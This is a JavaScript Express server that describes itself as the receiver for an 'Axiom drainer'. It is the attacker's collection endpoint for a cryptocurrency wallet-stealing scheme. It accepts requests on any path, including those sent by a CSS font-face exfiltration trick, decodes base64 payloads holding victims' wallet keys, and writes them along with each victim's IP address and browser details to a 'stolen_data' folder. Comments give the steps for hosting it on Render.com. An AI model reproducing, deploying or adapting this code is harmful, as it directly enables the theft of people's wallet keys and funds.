// server.js - Render.com compatible receiver for Axiom drainer
import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;   // Render.com requires this

const DATA_FOLDER = path.join(__dirname, 'stolen_data');

if (!fs.existsSync(DATA_FOLDER)) {
    fs.mkdirSync(DATA_FOLDER, { recursive: true });
}

app.use(express.json());

// Main endpoint - catches any path (including the font-face trick)
app.get('*', (req, res) => {
    const fullUrl = req.protocol + '://' + req.get('host') + req.originalUrl;
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const receivedAt = new Date().toISOString();

    console.log(`[${receivedAt}] Request received → ${fullUrl}`);

    try {
        // Extract the last segment (the base64 encoded data)
        const segments = req.path.split('/').filter(Boolean);
        const encodedData = segments[segments.length - 1] || '';

        if (encodedData.length < 20) {
            console.log("⚠️  No valid data found in URL");
            res.status(200).send('OK');
            return;
        }

        // Decode base64 to JSON
        const decodedStr = Buffer.from(encodedData, 'base64').toString('utf8');
        const data = JSON.parse(decodedStr);

        const output = {
            receivedAt: receivedAt,
            ip: req.ip || req.socket.remoteAddress,
            userAgent: data.header || req.get('user-agent') || 'unknown',
            timestamp: data.timestamp,
            site: data.site || 'Axiom',
            code: data.code,
            keysCount: data.keys ? data.keys.length : 0,
            keys: data.keys || []
        };

        // Save to file
        const filename = `stolen_${timestamp}.json`;
        const filepath = path.join(DATA_FOLDER, filename);

        fs.writeFileSync(filepath, JSON.stringify(output, null, 2));

        console.log(`✅ SAVED → ${filename} | ${output.keysCount} wallet(s) captured`);

        if (output.keysCount > 0) {
            console.log(`   Wallets found: ${output.keys.map(k => k.pub).join(', ')}`);
        }

    } catch (err) {
        console.error(`❌ Processing error: ${err.message}`);

        // Save raw info for debugging
        try {
            fs.writeFileSync(
                path.join(DATA_FOLDER, `raw_error_${timestamp}.txt`),
                `URL: ${fullUrl}\nError: ${err.message}\n`
            );
        } catch (e) {}
    }

    // Always return 200 quickly so the font-face doesn't break
    res.status(200).send('OK');
});

// Health check
app.get('/health', (req, res) => {
    res.status(200).send('Server is running');
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📁 Data folder: ${DATA_FOLDER}`);
    console.log(`💡 Your Render URL will be something like: https://your-app.onrender.com`);
});